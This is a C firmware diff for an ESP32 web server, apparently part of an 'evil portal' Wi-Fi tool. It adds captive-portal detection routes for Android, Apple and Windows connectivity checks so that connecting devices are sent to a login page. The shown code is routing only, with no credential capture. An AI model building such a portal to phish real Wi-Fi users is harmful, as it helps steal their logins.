@@ -1102,12 +1102,21 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
         return ESP_OK;
     }
     const char *uri = req->uri;
-    if (strcmp(uri, "/generate_204") == 0 || strcmp(uri, "/hotspot-detect.html") == 0 || strcmp(uri, "/connecttest.txt") == 0) {
-        httpd_resp_set_status(req, "302 Found");
-        httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
-        httpd_resp_send(req, NULL, 0);
+    if (
+        strcmp(uri, "/generate_204") == 0 ||
+        strcmp(uri, "/gen_204") == 0 ||
+        strcmp(uri, "/hotspot-detect.html") == 0 ||
+        strcmp(uri, "/connecttest.txt") == 0 ||
+        strcmp(uri, "/ncsi.txt") == 0 ||
+        strcmp(uri, "/success.txt") == 0 ||
+        strcmp(uri, "/library/test/success.html") == 0 ||
+        strcmp(uri, "/success.html") == 0 ||
+        strcmp(uri, "/") == 0 ||
+        strcmp(uri, "/redirect") == 0
+    ) {
+        esp_err_t r = portal_handler(req);
         ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
-        return ESP_OK;
+        return r;
     }
     // minimal logging for captive probe
 
@@ -1130,9 +1139,20 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+static esp_err_t captive_portal_head_ok_handler(httpd_req_t *req) {
+    if (login_done) {
+        httpd_resp_set_status(req, "204 No Content");
+    } else {
+        httpd_resp_set_status(req, "200 OK");
+        httpd_resp_set_type(req, "text/html");
+    }
+    httpd_resp_send(req, NULL, 0);
+    return ESP_OK;
+}
+
 httpd_handle_t start_portal_webserver(void) {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
-    config.max_uri_handlers = 15;
+    config.max_uri_handlers = 32;
     config.max_open_sockets = 13; // Increased from 7
     config.backlog_conn = 10;     // Increased from 7
     config.stack_size = 8192;
@@ -1140,11 +1160,25 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_uri_t portal_uri = {
             .uri = "/login", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL};
         httpd_uri_t portal_android_get = {.uri = "/generate_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
-        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_gen_get = {.uri = "/gen_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_gen_head = {.uri = "/gen_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t portal_apple_get = {.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
-        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t portal_root_get = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_root_head = {.uri = "/", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t microsoft_get = {.uri = "/connecttest.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
-        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t ncsi_get = {.uri = "/ncsi.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t ncsi_head = {.uri = "/ncsi.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t success_get = {.uri = "/success.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t success_head = {.uri = "/success.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t lib_success_get = {.uri = "/library/test/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t lib_success_head = {.uri = "/library/test/success.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t success_html_get = {.uri = "/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t success_html_head = {.uri = "/success.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
+        httpd_uri_t redirect_get = {.uri = "/redirect", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t redirect_head = {.uri = "/redirect", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
         httpd_uri_t log_handler_uri = {
             .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
         httpd_uri_t portal_png = {
@@ -1159,10 +1193,24 @@ httpd_handle_t start_portal_webserver(void) {
             .uri = ".html", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_register_uri_handler(evilportal_server, &portal_android_get);
         httpd_register_uri_handler(evilportal_server, &portal_android_head);
+        httpd_register_uri_handler(evilportal_server, &portal_android_gen_get);
+        httpd_register_uri_handler(evilportal_server, &portal_android_gen_head);
         httpd_register_uri_handler(evilportal_server, &portal_apple_get);
         httpd_register_uri_handler(evilportal_server, &portal_apple_head);
+        httpd_register_uri_handler(evilportal_server, &portal_root_get);
+        httpd_register_uri_handler(evilportal_server, &portal_root_head);
         httpd_register_uri_handler(evilportal_server, &microsoft_get);
         httpd_register_uri_handler(evilportal_server, &microsoft_head);
+        httpd_register_uri_handler(evilportal_server, &ncsi_get);
+        httpd_register_uri_handler(evilportal_server, &ncsi_head);
+        httpd_register_uri_handler(evilportal_server, &success_get);
+        httpd_register_uri_handler(evilportal_server, &success_head);
+        httpd_register_uri_handler(evilportal_server, &lib_success_get);
+        httpd_register_uri_handler(evilportal_server, &lib_success_head);
+        httpd_register_uri_handler(evilportal_server, &success_html_get);
+        httpd_register_uri_handler(evilportal_server, &success_html_head);
+        httpd_register_uri_handler(evilportal_server, &redirect_get);
+        httpd_register_uri_handler(evilportal_server, &redirect_head);
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &log_handler_uri);
 
